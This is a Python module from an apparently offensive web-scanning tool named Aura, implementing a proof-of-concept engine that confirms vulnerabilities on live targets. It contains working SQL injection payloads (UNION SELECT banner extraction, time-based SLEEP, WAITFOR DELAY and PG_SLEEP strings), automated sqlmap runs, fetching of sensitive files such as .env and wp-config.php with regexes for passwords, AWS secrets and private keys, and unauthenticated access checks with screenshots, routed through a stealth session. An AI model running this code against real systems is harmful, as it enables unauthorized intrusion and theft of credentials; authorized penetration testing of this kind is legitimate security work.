"""
Aura v6.0 — Deterministic PoC Engine
======================================
Transforms "potential" findings into CONFIRMED exploitations with hard evidence.
Three verification strategies:
  1. SQLi   → Banner extraction via UNION SELECT / sqlmap API
  2. LFI    → Read first 3 lines of accessible sensitive file
  3. Auth   → Screenshot of protected page accessed post-bypass
All confirmed findings get `confirmed=True` and `poc_evidence` field added.
"""
import asyncio
import re
import os
import shutil
from aura.core.stealth import AuraSession, StealthEngine
from aura.core import state
from rich.console import Console

console = Console()


class PoCEngine:
    """v6.0 Deterministic PoC Engine — turns 'potential' into 'CONFIRMED'."""

    SENSITIVE_PATTERNS = [
        re.compile(r'(?:DB_PASSWORD|SECRET_KEY|AWS_SECRET|api_key|password\s*=\s*|TOKEN)\s*[=:]\s*\S+', re.IGNORECASE),
        re.compile(r'(?:PRIVATE KEY|BEGIN RSA|mysql://|postgres://|mongodb://)', re.IGNORECASE),
    ]

    LFI_PATHS = [
        "/.env", "/.git/config", "/config.php", "/wp-config.php",
        "/docker-compose.yml", "/application.properties", "/settings.py",
        "/.htaccess", "/web.config",
    ]

    def __init__(self, stealth: StealthEngine = None):
        self.stealth = stealth or StealthEngine()
        self.session  = AuraSession(self.stealth)
        self.sleep_threshold = 4.5

    # ── 1. SQLi Banner Extraction ──────────────────────────────────────────
    async def verify_sqli(self, url: str, param: str) -> dict | None:
        """
        Try UNION SELECT banner extraction. Falls back to sqlmap API if installed.
        Returns confirmed evidence dict or None.
        """
        console.print(f"[bold cyan][🔬 PoC-SQLi] Verifying SQL Injection on {url} (param={param})...[/bold cyan]")

        # Try sqlmap --api first (non-blocking)
        if shutil.which("sqlmap"):
            try:
                target_url = f"{url}?{param}=1"
                proc = await asyncio.create_subprocess_exec(
                    "sqlmap", "-u", target_url, "--batch", "--banner",
                    "--level=1", "--risk=1", "--output-dir=/tmp/sqlmap_poc",
                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
                output = stdout.decode("utf-8", errors="ignore")
                banner_match = re.search(r'banner:\s*[\'"](.+?)[\'"]', output, re.IGNORECASE)
                if banner_match:
                    banner = banner_match.group(1)
                    console.print(f"[bold green][✔ PoC-SQLi CONFIRMED] DB Banner: {banner}[/bold green]")
                    return {
                        "confirmed": True,
                        "method": "sqlmap --banner",
                        "evidence": f"DB Banner extracted: '{banner}'",
                        "poc_evidence": f"sqlmap confirmed SQL Injection on param '{param}'. DB Banner: {banner}",
                    }
            except (asyncio.TimeoutError, Exception) as e:
                console.print(f"[dim yellow][!] sqlmap attempt failed: {e}. Falling back to UNION SELECT.[/dim yellow]")

        # Python UNION SELECT fallback (already in dast.py)
        payloads = [
            (f"' UNION SELECT 1,@@version,3,4-- -", re.compile(r'(\d+\.\d+\.\d+.*?mysql|MariaDB)', re.IGNORECASE)),
            (f"' UNION SELECT 1,version(),3-- -", re.compile(r'(PostgreSQL[\s\d.]+)', re.IGNORECASE)),
            (f"' UNION SELECT 1,@@servername,3-- -", re.compile(r'(Microsoft SQL Server[\s\d.]+)', re.IGNORECASE)),
        ]
        for payload, pattern in payloads:
            try:
                resp = await self.session.get(url, params={param: payload}, timeout=state.NETWORK_TIMEOUT)
                match = pattern.search(resp.text)
                if match:
                    banner = match.group(1).strip()
                    console.print(f"[bold green][✔ PoC-SQLi CONFIRMED] DB Banner: {banner}[/bold green]")
                    return {
                        "confirmed": True,
                        "method": "UNION SELECT extraction",
                        "evidence": f"DB Version/Banner: '{banner}'",
                        "poc_evidence": f"UNION SELECT confirmed SQL Injection. Banner: {banner}",
                    }
            except Exception:
                continue
        return None

    async def verify_time_sqli(self, url: str, param: str) -> dict | None:
        """
        v19.4: Deterministic Time-Based SQLi verification.
        Compares baseline response time with a Sleep(5) payload.
        """
        console.print(f"[bold magenta][🔬 PoC-TimeSQLi] Confirming Blind SQLi on {url}...[/bold magenta]")
        payloads = [
            "' AND SLEEP(8)--",             # MySQL
            "'; WAITFOR DELAY '0:0:8'--", # MSSQL
            "'; SELECT PG_SLEEP(8)--"      # Postgres
        ]
        
        try:
            # 1. Get baseline
            import time
            t1 = time.monotonic()
            await self.session.get(url, params={param: "1"}, timeout=state.NETWORK_TIMEOUT)
            baseline = time.monotonic() - t1
            
            for payload in payloads:
                t_start = time.monotonic()
                try:
                    await self.session.get(url, params={param: f"1{payload}"}, timeout=state.NETWORK_TIMEOUT)
                    elapsed = time.monotonic() - t_start
                    
                    if elapsed > (baseline + 5):
                        console.print(f"[bold red][✔ PoC-TimeSQLi CONFIRMED] Delay: {elapsed:.2f}s (Baseline: {baseline:.2f}s)[/bold red]")
                        return {
                            "confirmed": True,
                            "method": "Time-based inference",
                            "evidence": f"Injected SLEEP(8) caused {elapsed:.2f}s delay (Baseline {baseline:.2f}s).",
                            "poc_evidence": f"Deterministic Time-Based SQLi confirmed. Payload: {payload}",
                            "severity": "CRITICAL"
                        }
                except: continue
        except Exception as e:
            console.print(f"[dim red][!] Time-based verify failure: {e}[/dim red]")
        return None

    # ── 1.5 XSS Reflection Verification ──────────────────────────────────
    async def verify_xss(self, url: str) -> dict | None:
        """
        v19.4: Headless XSS Verification.
        Checks if a unique nonce is reflected in the DOM without sanitization.
        """
        import random
        nonce = f"aura_{random.getrandbits(32):x}"
        payload = f"<aura-poc-{nonce}>"
        
        console.print(f"[bold magenta][🔬 PoC-XSS] Probing for reflection on {url}...[/bold magenta]")
        
        try:
            # We use a simple GET first for speed, then could escalate to Playwright
            resp = await self.session.get(url, params={"aura_xss": payload}, timeout=state.NETWORK_TIMEOUT)
            if payload in resp.text:
                console.print(f"[bold red][✔ PoC-XSS CONFIRMED] Nonce {nonce} reflected in response body.[/bold red]")
                return {
                    "confirmed": True,
                    "method": "Reflected Nonce Detection",
                    "evidence": f"Payload {payload} reflected exactly in HTTP response.",
                    "poc_evidence": f"Reflected XSS confirmed via unique nonce reflection.",
                    "severity": "HIGH"
                }
        except Exception as e:
            console.print(f"[dim red][!] XSS verify failed: {e}[/dim red]")
        return None

    # ── 2. LFI / Secret File Read ─────────────────────────────────────────
    async def verify_lfi(self, base_url: str, path: str) -> dict | None:
        """
        Attempt to read the first 3 lines of a sensitive file to confirm LFI/exposure.
        Returns confirmed evidence dict or None.
        """
        console.print(f"[bold yellow][🔬 PoC-LFI] Reading sensitive file: {base_url}{path}[/bold yellow]")
        try:
            resp = await self.session.get(f"{base_url}{path}", timeout=state.NETWORK_TIMEOUT)
            if resp.status_code == 200 and len(resp.text) > 10:
                lines = [l.strip() for l in resp.text.splitlines() if l.strip()][:3]
                snippet = "\n".join(lines)

                # Check if it actually contains sensitive data
                has_secret = any(p.search(snippet) for p in self.SENSITIVE_PATTERNS)
                sev = "CRITICAL" if has_secret else "HIGH"
                evidence = f"File {path} is readable. First 3 lines:\n{snippet}"
                console.print(f"[bold {'red' if has_secret else 'yellow'}][✔ PoC-LFI CONFIRMED] {evidence}[/bold {'red' if has_secret else 'yellow'}]")
                return {
                    "confirmed": True,
                    "method": "Direct HTTP GET read",
                    "evidence": evidence,
                    "poc_evidence": evidence,
                    "severity": sev,
                }
        except Exception as e:
            console.print(f"[dim red][!] LFI verify failed for {path}: {e}[/dim red]")
        return None

    # ── 3. Auth Bypass Screenshot ─────────────────────────────────────────
    async def verify_auth_bypass(self, protected_url: str, session_cookies: dict = None) -> dict | None:
        """
        Try to access a protected page with current session cookies.
        If accessible (200 OK), screenshost as PoC.
        """
        console.print(f"[bold magenta][🔬 PoC-Auth] Checking access to {protected_url}...[/bold magenta]")
        try:
            resp = await self.session.get(protected_url, cookies=session_cookies or {}, timeout=state.NETWORK_TIMEOUT)
            if resp.status_code == 200:
                # Attempt screenshot via VisualEye
                try:
                    from aura.modules.vision import VisualEye
                    eye = VisualEye()
                    domain = protected_url.split("/")[2]
                    proof_path = await eye.capture_screenshot(domain, f"poc_auth_bypass_{domain}")
                    screenshot = proof_path.get("screenshot_path") if proof_path else None
                except Exception:
                    screenshot = None

                evidence = f"Protected page {protected_url} returned HTTP 200 without valid authentication."
                console.print(f"[bold red][✔ PoC-Auth CONFIRMED] {evidence}[/bold red]")
                return {
                    "confirmed": True,
                    "method": "HTTP GET without auth",
                    "evidence": evidence,
                    "poc_evidence": evidence,
                    "proof": screenshot,
                    "severity": "CRITICAL",
                }
        except Exception as e:
            console.print(f"[dim red][!] Auth bypass verify failed: {e}[/dim red]")
        return None

    # ── Main orchestrator: verify_all ─────────────────────────────────────
    async def verify_all(self, base_url: str, findings: list) -> list:
        """
        For each finding in the list, attempt deterministic verification.
        Upgrades confirmed findings with poc_evidence field.
        """
        console.print(f"[bold cyan][🔬 PoC Engine] Running deterministic verification on {len(findings)} findings...[/bold cyan]")
        
        # v19.4: Track verified signatures to prevent redundant 15-second timeouts
        verified_signatures = set()

        for f in findings:
            f_type    = (f.get("type") or f.get("finding_type") or "").lower()
            content   = f.get("content", "")

            # SQLi verification
            if "sql" in f_type and not f.get("confirmed"):
                url_match = re.search(r'(https?://[^?\s]+)\?(\w+)', content)
                if url_match:
                    sig = f"sqli_{url_match.group(1)}_{url_match.group(2)}"
                    if sig in verified_signatures: continue
                    verified_signatures.add(sig)
                    
                    # 1. Try UNION/sqlmap first
                    result = await self.verify_sqli(url_match.group(1), url_match.group(2))
                    if not result:
                        # 2. v19.4: Try Time-Based SQLi verification
                        result = await self.verify_time_sqli(url_match.group(1), url_match.group(2))
                    
                    if result:
                        f.update(result)
                        f["severity"] = "CRITICAL"

            # XSS verification
            elif "xss" in f_type and not f.get("confirmed"):
                url_match = re.search(r'(https?://[^\s\'\"]+)', content)
                if url_match:
                    sig = f"xss_{url_match.group(1)}"
                    if sig in verified_signatures: continue
                    verified_signatures.add(sig)
                    result = await self.verify_xss(url_match.group(1))
                    if result:
                        f.update(result)

            # LFI / sensitive file verification
            elif any(k in f_type for k in ("lfi", "disclosure", "leak", "exposure", "path", "secret")) and not f.get("confirmed"):
                # Try to identify the base URL and path from content
                url_match = re.search(r'(https?://[^\s\'"/]+)(/.+?)(?:\s|$)', content)
                if url_match:
                    base = f"{url_match.group(1)}"
                    path = url_match.group(2).split("?")[0]
                    sig = f"lfi_{base}_{path}"
                    if sig in verified_signatures: continue
                    verified_signatures.add(sig)
                    
                    if any(sensitive in path.lower() for sensitive in [".env", ".git", "config", "backup", "secret", "docker", ".svn", "password"]):
                        result = await self.verify_lfi(base, path)
                        if result:
                            f.update(result)

            # Auth Bypass verification
            elif any(k in f_type for k in ("auth", "bypass", "idor", "unauthorized")) and not f.get("confirmed"):
                url_match = re.search(r'(https?://[^\s\'\"]+)', content)
                if url_match:
                    sig = f"auth_{url_match.group(1)}"
                    if sig in verified_signatures: continue
                    verified_signatures.add(sig)
                    result = await self.verify_auth_bypass(url_match.group(1))
                    if result:
                        f.update(result)

        confirmed_count = sum(1 for f in findings if f.get("confirmed"))
        console.print(f"[green][✔ PoC Engine] {confirmed_count}/{len(findings)} findings CONFIRMED with hard evidence.[/green]")
        return findings
